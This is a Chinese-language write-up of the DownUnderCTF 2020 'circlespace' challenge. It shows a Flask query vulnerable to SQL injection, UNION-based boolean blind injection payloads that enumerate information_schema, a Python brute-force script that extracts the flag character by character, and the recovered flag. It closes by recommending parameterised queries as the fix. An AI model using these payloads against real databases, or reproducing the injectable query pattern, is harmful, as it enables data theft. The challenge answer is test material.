# DownUnderCTF 2020 - circlespace

## 题目简述

应用允许用户创建 circle、添加成员，并通过姓名查询某人是否属于该 circle。创建和写入接口使用参数化 SQL，但查询接口把 GET 参数 `name` 直接插进双引号字符串，形成 SQL 注入。页面只反馈“is part”或“is not part”，异常也被统一当作不存在，因此需要利用布尔响应逐字符枚举数据库。

## 解题过程

先创建一个 circle，记录重定向后的永久链接。漏洞查询为：

```python
sql_exists = (
    f'SELECT name FROM people '
    f'WHERE circle_id={circle_id} AND name="{name}"'
)
cursor.execute(sql_exists)
result = cursor.fetchone()

if result:
    flash(f'{name} is part of your circle')
else:
    flash(f'{name} is not part of your circle')
```

`name` 没有参数化，而且 GET 路由不像添加成员路由那样截断为 12 个字符。构造 `UNION SELECT`，当条件匹配时让查询返回一行，页面就成为布尔 oracle：

```sql
" AND 1=0
UNION SELECT 1
FROM information_schema.tables
WHERE table_schema="circlespace"
  AND table_type="BASE TABLE"
  AND table_name LIKE "the%"
-- a
```

将换行压成空格后放入 `name` 参数。`AND 1=0` 排除原查询结果；若 `LIKE` 前缀正确，`UNION` 返回 `1`，响应出现 `is part`。先枚举 `information_schema.tables` 得到可疑表 `the_cfg`，再枚举列名：

```sql
" AND 1=0
UNION SELECT 1
FROM information_schema.columns
WHERE table_schema="circlespace"
  AND table_name="the_cfg"
  AND column_name LIKE "cfg_%"
-- a
```

得到 `cfg_key` 和 `cfg_value` 后，对 `cfg_value` 做区分大小写的前缀搜索。MySQL 默认排序规则可能忽略大小写，因此要使用 `LIKE BINARY`：

```python
import requests
import string

alphabet = string.ascii_letters + string.digits + "_{}-"
prefix = ""

while not prefix.endswith("}"):
    for char in alphabet:
        guess = prefix + char
        payload = (
            '" AND 1=0 UNION SELECT 1 FROM the_cfg '
            f'WHERE cfg_value LIKE BINARY "{guess}%" -- a'
        )
        response = session.get(
            f"{circle_url}/people",
            params={"name": payload},
        )
        if "is not part" not in response.text:
            prefix = guess
            print(prefix)
            break
    else:
        raise RuntimeError("当前字符集未命中")
```

逐字符恢复得到：

```text
DUCTF{n0T_squar3spaCe_7o0N2kf1}
```

仓库的 `schema.sql` 也确认 `the_cfg.cfg_value` 保存了同一 flag。

## 方法总结

盲注不一定依赖报错或延时；任何稳定的真假差异都能成为 oracle。本题应先用 `information_schema` 恢复表和列，再枚举目标值，并注意 flag 的大小写。根本修复是对查询接口也使用参数占位符，而不是过滤 `sleep` 或吞掉异常。
